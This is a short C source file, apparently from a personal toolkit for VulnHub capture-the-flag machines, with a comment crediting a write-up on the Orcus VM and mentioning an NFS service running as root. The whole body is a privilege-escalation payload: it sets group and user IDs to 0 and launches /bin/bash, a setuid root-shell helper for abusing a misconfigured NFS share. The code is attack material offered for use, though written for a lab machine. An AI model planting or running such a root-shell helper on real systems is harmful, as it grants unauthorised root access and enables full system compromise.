#include <unistd.h>

/**
 *   Credits to g0blin research: https://g0blin.co.uk/orcus-vulnhub-writeup/ 
 *   once I found the nsf service running as root and open I googled how to privesc with C
 *   g0blin's writeup on the VM that spawned this toolkit came up, figured that would be a good example
 **/

main(int argc, char ** argv, char ** envp)
{
    setgid(0);
    setuid(0);
    system("/bin/bash", argv, envp);
    return 0;
}